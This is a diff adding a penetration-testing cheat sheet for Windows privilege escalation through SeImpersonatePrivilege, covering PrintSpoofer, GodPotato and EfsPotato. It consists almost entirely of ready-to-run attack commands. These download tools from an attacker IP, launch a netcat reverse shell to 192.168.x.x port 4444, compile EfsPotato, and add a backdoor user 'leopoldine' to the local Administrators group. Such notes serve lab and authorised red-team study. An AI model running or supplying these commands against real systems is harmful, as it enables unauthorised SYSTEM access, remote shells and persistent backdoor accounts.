@@ -1,0 +1,52 @@
+### impersonation ###
+
+
+##################
+## PrintSpoofer ##
+##################
+# https://github.com/itm4n/PrintSpoofer
+# https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0
+# SeImpersonatePrivilege + Printer service
+.\PrintSpoofer64.exe -i -c cmd
+
+
+
+###############
+## GodPotato ##
+###############
+# https://github.com/BeichenDream/GodPotato
+# https://github.com/BeichenDream/GodPotato/releases
+# SeImpersonatePrivilege (Win Serv 2012 / 2022 / Win8 / Win11)
+
+iwr -uri http://192.168.x.x/GodPotato-NET4.exe -Outfile GodPotato-NET4.exe
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"
+.\GodPotato-NET4.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.x.x 4444"
+
+
+
+###############
+## EfsPotato ##
+###############
+# https://github.com/zcgonvh/EfsPotato
+# SeImpersonatePrivilege
+
+## Compile
+Get-ChildItem -Path "C:\" -Include csc.exe  -File -Recurse -ErrorAction SilentlyContinue
+iwr -uri http://192.168.x.x/EfsPotato.cs -Outfile EfsPotato.cs
+
+## for 4.x
+csc.exe EfsPotato.cs -nowarn:1691,618
+csc /platform:x86 EfsPotato.cs -nowarn:1691,618
+
+## for 2.0/3.5
+C:\Windows\Microsoft.Net\Framework\V3.5\csc.exe EfsPotato.cs -nowarn:1691,618
+C:\Windows\Microsoft.Net\Framework\V3.5\csc.exe /platform:x86 EfsPotato.cs -nowarn:1691,618
+
+## Usage
+.\EfsPotato.exe whoami
+.\EfsPotato.exe "net user /add leopoldine Leopoldine123@"
+.\EfsPotato.exe "net localgroup Administrators leopoldine /add"
+
+
+
+
